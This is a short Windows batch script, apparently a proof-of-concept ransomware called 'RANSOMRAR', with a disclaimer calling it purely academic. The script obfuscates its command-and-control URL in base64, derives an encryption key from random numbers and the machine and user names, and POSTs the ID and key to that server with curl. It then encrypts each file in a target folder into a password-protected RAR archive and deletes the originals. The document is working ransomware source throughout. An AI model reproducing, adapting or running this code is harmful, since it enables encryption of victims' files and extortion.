@echo off
color c0
title RANSOMRAR v1
REM # RANSOMRAR by jhdbw
REM # This project is purely academic, use at your own risk. I do not encourage in any way the use of this software illegally or to attack targets without their previous authorization.

GOTO INI

:INI
REM # SET PARAMETERS
echo # SET PARAMETERS
REM set b64="http://127.0.0.1:7777/"
set b64=Imh0dHA6Ly8xMjcuMC4wLjE6Nzc3Ny8i
set path="C:\Program Files\WinRAR\";%path%
set target=%HOMEPATH%\ransomrar
mkdir %target%

REM # SET C2
echo # SET C2
echo %b64%>b64
certutil -decode b64 c2
FOR /F %%c IN (c2) do set c2=%%c
del /F b64
del /F c2

REM # GENERATE KEY
echo # GENERATE KEY
set id=%RANDOM%%RANDOM%%RANDOM%
set pass=%RANDOM%%COMPUTERNAME%%RANDOM%%USERNAME%
echo %pass%>temp
certutil -hashfile temp SHA256 | findstr /i /v sha256 | findstr /i /v certutil>s256
FOR /F %%p IN (s256) do set key=%%p
echo %key%>key_%id%.txt
echo %id%>ID_%id%.txt

REM # SEND KEY
:SENDKEY
echo # SEND KEY
timeout 5
curl -X POST -F id=%id% -F key=%key% %c2%
echo %ERRORLEVEL%
set error=%ERRORLEVEL%
echo %error%
REM # Error level 7: Connection refused
REM # Error level 28: Timed out
REM # Error level 52: Empty reply from server
IF %error% NEQ 52 GOTO SENDKEY

REM # DELETE TEMPORARY FILES
echo # DELETE TEMPORARY FILES
del /F temp
del /F s256

REM # START ENCRYPTION
echo # START ENCRYPTION
cd %target%
echo TARGET:
echo %target%

FOR /R %%d IN (*.*) do rar a -ep -df -x*.dll -p%key% "%%d.rar" "%%d"

REM # END
:END
echo # END

timeout 30
exit
